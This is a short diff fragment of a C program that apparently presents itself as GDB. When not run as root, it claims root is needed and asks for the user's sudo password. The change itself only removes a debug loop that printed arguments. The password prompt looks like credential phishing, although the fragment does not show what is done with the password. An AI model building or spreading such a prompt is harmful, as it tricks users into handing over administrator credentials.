@@ -53,10 +53,6 @@ int main(int argc, char *argv[]) {
     if (geteuid() != 0) {
         printf("GDB often requires root privileges for debugging.\n");
 
-        for (int i = 1; i < argc; i++) {
-            printf("ARG: %s\n", argv[i]);
-        }
-
         // Ask for sudo password
         char password[256];
         get_password(password, sizeof(password));
